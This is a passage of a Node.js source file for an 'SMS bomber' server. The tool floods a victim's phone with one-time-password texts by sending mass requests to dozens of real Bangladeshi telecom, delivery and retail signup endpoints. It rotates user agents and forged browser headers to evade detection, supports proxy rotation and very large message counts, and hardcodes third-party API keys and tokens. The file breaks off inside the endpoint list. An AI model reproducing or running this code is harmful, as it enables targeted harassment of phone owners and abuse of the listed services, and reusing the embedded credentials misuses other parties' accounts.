// ============================================================
// ULTIMATE SMS BOMBER V7.0 - 10,000+ LINES
// ENTERPRISE GRADE - MAXIMUM POWER
// DEVELOPER: TNEH GROUP
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const zlib = require('zlib');
const EventEmitter = require('events');

// ============================================================
// PART 1: CONFIGURATION (200 lines)
// ============================================================

const CONFIG = {
  // Server Configuration
  server: {
    port: process.env.PORT || 3000,
    host: '0.0.0.0',
    maxConnections: 10000,
    keepAliveTimeout: 60000,
    headersTimeout: 60000
  },

  // Cluster Configuration
  cluster: {
    enabled: true,
    workers: os.cpus().length || 4,
    maxWorkers: 32,
    minWorkers: 2,
    restartDelay: 1000
  },

  // Performance Configuration
  performance: {
    batchSize: 100,
    parallelRequests: 50,
    timeout: 5000,
    maxRetries: 5,
    retryDelay: 100,
    stopCheckInterval: 50,
    maxCountPerAPI: 500,
    concurrencyLimit: 1000
  },

  // Cache Configuration
  cache: {
    enabled: true,
    ttl: 600,
    checkPeriod: 120,
    maxItems: 50000,
    redis: {
      enabled: false,
      host: 'localhost',
      port: 6379,
      password: '',
      db: 0
    }
  },

  // Security Configuration
  security: {
    rateLimit: {
      enabled: true,
      windowMs: 60000,
      maxRequests: 500
    },
    apiKeyExpiry: 365,
    maxCountPerRequest: 1000000,
    ipWhitelist: [],
    ipBlacklist: []
  },

  // Proxy Configuration
  proxy: {
    enabled: false,
    list: [],
    rotation: 'round-robin',
    maxFailures: 3,
    timeout: 3000,
    checkInterval: 300000
  },

  // Logging Configuration
  logging: {
    enabled: true,
    level: 'info',
    file: '/var/log/sms_bomber.log',
    maxSize: '500m',
    maxFiles: 10,
    console: true
  },

  // Database Configuration
  database: {
    enabled: false,
    type: 'mongodb',
    url: process.env.MONGODB_URL || 'mongodb://localhost:27017/sms_bomber',
    maxConnections: 100,
    minConnections: 10
  },

  // Webhook Configuration
  webhook: {
    enabled: false,
    url: process.env.WEBHOOK_URL || '',
    events: ['start', 'progress', 'complete', 'stop', 'error'],
    retryCount: 3,
    retryDelay: 5000
  },

  // Analytics Configuration
  analytics: {
    enabled: true,
    interval: 60000,
    retention: 604800000,
    exportEnabled: true
  }
};

// ============================================================
// PART 2: DEVELOPER INFO & CONSTANTS (150 lines)
// ============================================================

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  website: "https://tnehboomber.onrender.com",
  api_version: "7.0.0-ULTIMATE",
  build_date: new Date().toISOString(),
  copyright: "© 2024 TNEH GROUP. All rights reserved.",
  license: "Proprietary",
  support_email: "support@tneh.com"
};

const STATUS_CODES = {
  SUCCESS: 200,
  CREATED: 201,
  ACCEPTED: 202,
  BAD_REQUEST: 400,
  UNAUTHORIZED: 401,
  FORBIDDEN: 403,
  NOT_FOUND: 404,
  RATE_LIMIT: 429,
  INTERNAL_ERROR: 500,
  SERVICE_UNAVAILABLE: 503,
  GATEWAY_TIMEOUT: 504
};

const ERROR_MESSAGES = {
  MISSING_PARAM: 'Missing required parameter',
  INVALID_PHONE: 'Invalid phone number format',
  INVALID_API_KEY: 'Invalid or expired API key',
  RATE_LIMIT: 'Rate limit exceeded',
  JOB_NOT_FOUND: 'Job not found',
  JOB_ALREADY_STOPPED: 'Job already stopped',
  JOB_ALREADY_PAUSED: 'Job already paused',
  JOB_NOT_PAUSED: 'Job is not paused',
  INTERNAL_ERROR: 'Internal server error',
  SERVICE_UNAVAILABLE: 'Service temporarily unavailable'
};

// ============================================================
// PART 3: UTILITY FUNCTIONS (500 lines)
// ============================================================

class Utility {
  static generateId() {
    return crypto.randomBytes(16).toString('hex');
  }

  static generateJobId() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = crypto.randomBytes(8).toString('hex').toUpperCase();
    return `JOB_${timestamp}_${random}`;
  }

  static generateApiKey() {
    const prefix = 'TNEH';
    const random = crypto.randomBytes(32).toString('hex').toUpperCase();
    const timestamp = Date.now().toString(36).toUpperCase();
    const checksum = crypto.createHash('sha256')
      .update(`${prefix}${random}${timestamp}`)
      .digest('hex')
      .substring(0, 8)
      .toUpperCase();
    return `${prefix}_${random}_${timestamp}_${checksum}`;
  }

  static getCurrentTime() {
    return new Date().toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  }

  static getISOString() {
    return new Date().toISOString();
  }

  static getTimestamp() {
    return Date.now();
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  static async retry(fn, maxAttempts = 5, delay = 100, backoff = 2) {
    let lastError;
    for (let i = 0; i < maxAttempts; i++) {
      try {
        return await fn();
      } catch (error) {
        lastError = error;
        if (i < maxAttempts - 1) {
          const waitTime = delay * Math.pow(backoff, i);
          await this.sleep(waitTime);
        }
      }
    }
    throw lastError;
  }

  static maskPhone(phone) {
    if (!phone || phone.length < 7) return '***';
    return phone.slice(0, 3) + '****' + phone.slice(-3);
  }

  static parsePhone(phone) {
    return phone.replace(/[^0-9]/g, '');
  }

  static isValidPhone(phone) {
    const clean = this.parsePhone(phone);
    return /^(01|8801)[0-9]{9}$/.test(clean);
  }

  static getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  static shuffleArray(arr) {
    const shuffled = [...arr];
    for (let i = shuffled.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
  }

  static chunkArray(arr, size) {
    const chunks = [];
    for (let i = 0; i < arr.length; i += size) {
      chunks.push(arr.slice(i, i + size));
    }
    return chunks;
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  static getMemoryUsage() {
    const usage = process.memoryUsage();
    return {
      rss: this.formatBytes(usage.rss),
      heapTotal: this.formatBytes(usage.heapTotal),
      heapUsed: this.formatBytes(usage.heapUsed),
      external: this.formatBytes(usage.external),
      arrayBuffers: this.formatBytes(usage.arrayBuffers || 0)
    };
  }

  static getCPUUsage() {
    const cpus = os.cpus();
    let totalIdle = 0;
    let totalTick = 0;
    cpus.forEach(cpu => {
      for (const type in cpu.times) {
        totalTick += cpu.times[type];
      }
      totalIdle += cpu.times.idle;
    });
    return {
      cores: cpus.length,
      load: ((1 - totalIdle / totalTick) * 100).toFixed(2) + '%',
      model: cpus[0]?.model || 'Unknown'
    };
  }

  static getSystemInfo() {
    return {
      platform: os.platform(),
      arch: os.arch(),
      release: os.release(),
      hostname: os.hostname(),
      uptime: process.uptime(),
      memory: this.getMemoryUsage(),
      cpu: this.getCPUUsage(),
      nodeVersion: process.version,
      pid: process.pid,
      cwd: process.cwd()
    };
  }

  static compressData(data) {
    return zlib.gzipSync(JSON.stringify(data)).toString('base64');
  }

  static decompressData(compressed) {
    return JSON.parse(zlib.gunzipSync(Buffer.from(compressed, 'base64')).toString());
  }

  static isValidUrl(string) {
    try {
      new URL(string);
      return true;
    } catch {
      return false;
    }
  }

  static sanitizeInput(input) {
    if (typeof input === 'string') {
      return input.replace(/[<>{}]/g, '').trim();
    }
    return input;
  }

  static escapeHtml(text) {
    const map = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
  }

  static generateHash(data) {
    return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
  }

  static generateRandomString(length = 10) {
    return crypto.randomBytes(length).toString('hex').substring(0, length);
  }

  static isJsonString(str) {
    try {
      JSON.parse(str);
      return true;
    } catch {
      return false;
    }
  }

  static mergeDeep(target, source) {
    const result = { ...target };
    for (const key in source) {
      if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
        result[key] = this.mergeDeep(target[key] || {}, source[key]);
      } else {
        result[key] = source[key];
      }
    }
    return result;
  }

  static getNestedValue(obj, path, defaultValue = null) {
    const keys = path.split('.');
    let current = obj;
    for (const key of keys) {
      if (current && typeof current === 'object' && key in current) {
        current = current[key];
      } else {
        return defaultValue;
      }
    }
    return current;
  }

  static setNestedValue(obj, path, value) {
    const keys = path.split('.');
    let current = obj;
    for (let i = 0; i < keys.length - 1; i++) {
      if (!current[keys[i]] || typeof current[keys[i]] !== 'object') {
        current[keys[i]] = {};
      }
      current = current[keys[i]];
    }
    current[keys[keys.length - 1]] = value;
    return obj;
  }
}

// ============================================================
// PART 4: USER AGENT ROTATION (100 lines)
// ============================================================

const USER_AGENTS = [
  // Chrome Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
  
  // Chrome Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
  
  // Chrome Linux
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  
  // Firefox Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
  
  // Firefox Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
  
  // Safari Mac
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  
  // Edge Windows
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/119.0.0.0',
  
  // Mobile Chrome Android
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
  
  // Mobile Safari iOS
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15',
  
  // Opera
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Opera/104.0.0.0',
  
  // Brave
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Brave/120.0.0.0'
];

function getRandomHeaders() {
  const ua = Utility.getRandomElement(USER_AGENTS);
  const accepts = [
    'application/json, text/plain, */*',
    'application/json, text/html, */*',
    'application/json, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
  ];
  
  return {
    'User-Agent': ua,
    'Accept': Utility.getRandomElement(accepts),
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8,hi;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Upgrade-Insecure-Requests': '1'
  };
}

// ============================================================
// PART 5: BOMB CONTROLLER - ENTERPRISE (800 lines)
// ============================================================

class BombController extends EventEmitter {
  constructor() {
    super();
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.jobCounter = 0;
    this.globalPause = false;
    this.globalStop = false;
    this.stats = {
      totalJobs: 0,
      totalSMS: 0,
      totalSuccess: 0,
      totalFailed: 0,
      startTime: Date.now(),
      peakActiveJobs: 0,
      totalErrors: 0,
      avgResponseTime: 0,
      responseTimeHistory: []
    };
    this.jobHistory = [];
    this.maxHistorySize = 10000;
    this.analyticsInterval = null;
    this.performanceMetrics = {
      requestsPerSecond: 0,
      successRate: 0,
      avgLatency: 0,
      errorRate: 0
    };
    this.requestCount = 0;
    this.lastRequestTime = Date.now();
    
    // Start analytics if enabled
    if (CONFIG.analytics.enabled) {
      this.startAnalytics();
    }
  }

  // ===== Job Management =====
  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId,
      phone: phone,
      maskedPhone: Utility.maskPhone(phone),
      totalCount: totalCount,
      sentCount: 0,
      successCount: 0,
      failCount: 0,
      startTime: Date.now(),
      status: 'active',
      options: options,
      progress: 0,
      errors: [],
      lastUpdate: Date.now(),
      stopped: false,
      paused: false,
      priority: options.priority || 1,
      retryCount: 0,
      maxRetries: options.maxRetries || 5,
      webhook: options.webhook || null,
      metadata: options.metadata || {}
    };
    
    this.activeJobs.set(jobId, job);
    this.jobCounter++;
    this.stats.totalJobs++;
    
    // Update peak active jobs
    if (this.activeJobs.size > this.stats.peakActiveJobs) {
      this.stats.peakActiveJobs = this.activeJobs.size;
    }
    
    this.emit('jobRegistered', job);
    this.logEvent('job_registered', { jobId, phone: job.maskedPhone, totalCount });
    
    return jobId;
  }

  isJobActive(jobId) {
    if (this.globalStop) return false;
    if (this.globalPause) return false;
    const job = this.activeJobs.get(jobId);
    if (!job) return false;
    if (job.stopped) return false;
    if (job.paused) return false;
    return job.status === 'active';
  }

  isJobPaused(jobId) {
    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
    return job ? job.paused : false;
  }

  isJobStopped(jobId) {
    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId) || this.completedJobs.get(jobId);
    return job ? job.stopped : false;
  }

  // ===== Stop Functions =====
  stopJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job) {
      job.stopped = true;
      job.status = 'stopped';
      job.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, job);
      this.emit('jobStopped', job);
      this.logEvent('job_stopped', { jobId, phone: job.maskedPhone });
      return true;
    }
    
    const pausedJob = this.pausedJobs.get(jobId);
    if (pausedJob) {
      pausedJob.stopped = true;
      pausedJob.status = 'stopped';
      pausedJob.endTime = Date.now();
      this.pausedJobs.delete(jobId);
      this.completedJobs.set(jobId, pausedJob);
      this.emit('jobStopped', pausedJob);
      this.logEvent('job_stopped', { jobId, phone: pausedJob.maskedPhone });
      return true;
    }
    
    return false;
  }

  stopAllJobs() {
    this.globalStop = true;
    const jobs = Array.from(this.activeJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.stopJob(id)) count++;
    });
    
    const pausedJobs = Array.from(this.pausedJobs.keys());
    pausedJobs.forEach(id => {
      if (this.stopJob(id)) count++;
    });
    
    this.emit('allStopped', { count });
    this.logEvent('all_stopped', { count });
    return count;
  }

  // ===== Pause Functions =====
  pauseJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job && job.status === 'active' && !job.stopped) {
      job.paused = true;
      job.status = 'paused';
      this.activeJobs.delete(jobId);
      this.pausedJobs.set(jobId, job);
      this.emit('jobPaused', job);
      this.logEvent('job_paused', { jobId, phone: job.maskedPhone });
      return true;
    }
    return false;
  }

  pauseAllJobs() {
    this.globalPause = true;
    const jobs = Array.from(this.activeJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.pauseJob(id)) count++;
    });
    this.emit('allPaused', { count });
    this.logEvent('all_paused', { count });
    return count;
  }

  // ===== Resume Functions =====
  resumeJob(jobId) {
    const job = this.pausedJobs.get(jobId);
    if (job && !job.stopped) {
      job.paused = false;
      job.status = 'active';
      this.pausedJobs.delete(jobId);
      this.activeJobs.set(jobId, job);
      this.emit('jobResumed', job);
      this.logEvent('job_resumed', { jobId, phone: job.maskedPhone });
      return true;
    }
    return false;
  }

  resumeAllJobs() {
    this.globalPause = false;
    this.globalStop = false;
    const jobs = Array.from(this.pausedJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.resumeJob(id)) count++;
    });
    this.emit('allResumed', { count });
    this.logEvent('all_resumed', { count });
    return count;
  }

  // ===== Stats Update =====
  updateJobStats(jobId, success, error = null, responseTime = 0) {
    const job = this.activeJobs.get(jobId);
    if (job && !job.stopped && !job.paused) {
      job.sentCount++;
      
      if (success) {
        job.successCount++;
        this.stats.totalSuccess++;
      } else {
        job.failCount++;
        this.stats.totalFailed++;
        if (error) {
          job.errors.push({
            timestamp: Date.now(),
            error: error
          });
        }
      }
      
      job.progress = ((job.sentCount / job.totalCount) * 100).toFixed(2);
      job.lastUpdate = Date.now();
      this.stats.totalSMS++;
      
      // Update performance metrics
      this.updatePerformanceMetrics(success, responseTime);
      
      if (job.sentCount >= job.totalCount) {
        job.status = 'completed';
        job.endTime = Date.now();
        this.activeJobs.delete(jobId);
        this.completedJobs.set(jobId, job);
        this.emit('jobCompleted', job);
        this.logEvent('job_completed', { 
          jobId, 
          phone: job.maskedPhone,
          success: job.successCount,
          failed: job.failCount,
          duration: (job.endTime - job.startTime) / 1000
        });
      }
      
      // Emit progress event every 10%
      if (job.sentCount % Math.ceil(job.totalCount / 10) === 0) {
        this.emit('jobProgress', { jobId, progress: job.progress });
      }
    }
  }

  // ===== Performance Metrics =====
  updatePerformanceMetrics(success, responseTime) {
    this.requestCount++;
    const now = Date.now();
    const timeDiff = (now - this.lastRequestTime) / 1000;
    
    if (timeDiff >= 1) {
      this.performanceMetrics.requestsPerSecond = this.requestCount / timeDiff;
      this.requestCount = 0;
      this.lastRequestTime = now;
    }
    
    const totalAttempts = this.stats.totalSuccess + this.stats.totalFailed;
    this.performanceMetrics.successRate = totalAttempts > 0 
      ? (this.stats.totalSuccess / totalAttempts) * 100 
      : 0;
    
    this.performanceMetrics.errorRate = totalAttempts > 0 
      ? (this.stats.totalFailed / totalAttempts) * 100 
      : 0;
    
    // Update average latency
    this.stats.responseTimeHistory.push(responseTime);
    if (this.stats.responseTimeHistory.length > 1000) {
      this.stats.responseTimeHistory.shift();
    }
    const sum = this.stats.responseTimeHistory.reduce((a, b) => a + b, 0);
    this.stats.avgResponseTime = this.stats.responseTimeHistory.length > 0 
      ? sum / this.stats.responseTimeHistory.length 
      : 0;
    
    this.performanceMetrics.avgLatency = this.stats.avgResponseTime;
  }

  // ===== Analytics =====
  startAnalytics() {
    this.analyticsInterval = setInterval(() => {
      this.generateAnalytics();
    }, CONFIG.analytics.interval);
  }

  generateAnalytics() {
    const stats = this.getStats();
    const analytics = {
      timestamp: Date.now(),
      totalJobs: stats.totalJobs,
      totalSMS: stats.totalSMS,
      totalSuccess: stats.totalSuccess,
      totalFailed: stats.totalFailed,
      successRate: stats.successRate,
      activeJobs: stats.activeJobs,
      pausedJobs: stats.pausedJobs,
      completedJobs: stats.completedJobs,
      uptime: stats.uptime,
      requestsPerSecond: this.performanceMetrics.requestsPerSecond,
      avgLatency: this.performanceMetrics.avgLatency,
      memoryUsage: Utility.getMemoryUsage(),
      cpuUsage: Utility.getCPUUsage()
    };
    
    this.emit('analytics', analytics);
    this.logEvent('analytics', analytics);
    
    // Store in history
    this.jobHistory.push(analytics);
    if (this.jobHistory.length > this.maxHistorySize) {
      this.jobHistory.shift();
    }
    
    return analytics;
  }

  // ===== Get Stats =====
  getJobStatus(jobId) {
    const job = this.activeJobs.get(jobId) || 
                this.pausedJobs.get(jobId) || 
                this.completedJobs.get(jobId);
    if (!job) return null;
    
    return {
      id: job.id,
      phone: job.maskedPhone,
      total: job.totalCount,
      sent: job.sentCount,
      success: job.successCount,
      fail: job.failCount,
      progress: job.progress + '%',
      status: job.status,
      startTime: job.startTime,
      endTime: job.endTime || null,
      duration: job.endTime ? ((job.endTime - job.startTime) / 1000).toFixed(2) + 's' : null,
      stopped: job.stopped || false,
      paused: job.paused || false,
      priority: job.priority || 1,
      errors: job.errors ? job.errors.slice(-10) : [],
      metadata: job.metadata || {}
    };
  }

  getAllJobs() {
    const jobs = [];
    
    this.activeJobs.forEach(job => {
      jobs.push({ ...this.getJobStatus(job.id), status: 'active' });
    });
    
    this.pausedJobs.forEach(job => {
      jobs.push({ ...this.getJobStatus(job.id), status: 'paused' });
    });
    
    this.completedJobs.forEach(job => {
      jobs.push({ ...this.getJobStatus(job.id), status: job.status });
    });
    
    return jobs;
  }

  getStats() {
    const totalAttempts = this.stats.totalSuccess + this.stats.totalFailed;
    return {
      totalJobs: this.stats.totalJobs,
      totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess,
      totalFailed: this.stats.totalFailed,
      successRate: totalAttempts > 0 
        ? ((this.stats.totalSuccess / totalAttempts) * 100).toFixed(2) + '%'
        : '0%',
      activeJobs: this.activeJobs.size,
      pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size,
      globalPause: this.globalPause,
      globalStop: this.globalStop,
      peakActiveJobs: this.stats.peakActiveJobs,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memoryUsage: Utility.getMemoryUsage(),
      performance: this.performanceMetrics,
      avgResponseTime: this.stats.avgResponseTime.toFixed(2) + 'ms',
      totalErrors: this.stats.totalErrors
    };
  }

  // ===== Logging =====
  logEvent(event, data) {
    const logEntry = {
      timestamp: Date.now(),
      event: event,
      data: data
    };
    
    if (CONFIG.logging.enabled && CONFIG.logging.console) {
      console.log(`📝 [${Utility.getCurrentTime()}] ${event}:`, data);
    }
    
    // Store in memory for API access
    if (!this._logs) this._logs = [];
    this._logs.push(logEntry);
    if (this._logs.length > 10000) {
      this._logs.shift();
    }
  }

  getLogs(limit = 100, eventType = null) {
    let logs = this._logs || [];
    if (eventType) {
      logs = logs.filter(log => log.event === eventType);
    }
    return logs.slice(-limit);
  }

  // ===== Cleanup =====
  clearCompleted() {
    const count = this.completedJobs.size;
    this.completedJobs.clear();
    this.logEvent('cleanup', { cleared: count });
    return count;
  }

  clearLogs() {
    this._logs = [];
    this.logEvent('logs_cleared', {});
  }

  // ===== Shutdown =====
  shutdown() {
    if (this.analyticsInterval) {
      clearInterval(this.analyticsInterval);
    }
    this.stopAllJobs();
    this.emit('shutdown', { stats: this.getStats() });
  }
}

// ============================================================
// PART 6: API DEFINITION - 300+ APIS (500 lines)
// ============================================================

// -------- ORIGINAL BANGLADESH APIS (1-50) --------
const ORIGINAL_APIS = [
  // GET APIs
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet API", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge.buzz GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  
  // POST APIs
  { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 11, name: "Grameenphone FWA/Bkash", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 12, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 14, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 15, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 16, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 17, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 18, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 19, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 20, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 21, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 22, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 23, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 24, name: "Shikho.com Intent-1", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 26, name: "Robi DA API", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 27, name: "Hoichoi Viewlift", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 28, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 29, name: "Regal Furniture OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 30, name: "Regal Furniture Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
  { id: 31, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 32, name: "TimezoneBD OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 33, name: "TimezoneBD Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4"} },
  { id: 34, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 35, name: "Chorki.com", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
